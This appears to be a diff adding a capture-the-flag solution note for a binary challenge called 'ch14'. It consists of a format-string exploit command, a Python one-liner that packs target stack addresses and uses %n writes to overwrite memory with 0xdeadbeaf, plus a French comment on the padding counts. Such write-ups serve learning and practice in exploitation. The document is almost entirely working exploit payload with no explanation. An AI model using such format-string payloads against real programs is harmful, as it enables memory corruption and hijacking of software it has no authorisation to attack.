@@ -1,0 +1,3 @@
+./ch14 $(python -c 'print "\xd8\xfb\xff\xbfAAAA\xda\xfb\xff\xbf"+"%179939x%9$n%8126x%11$n"')
+
+179939 -> dead 8126 -> beaf (décalage compris)
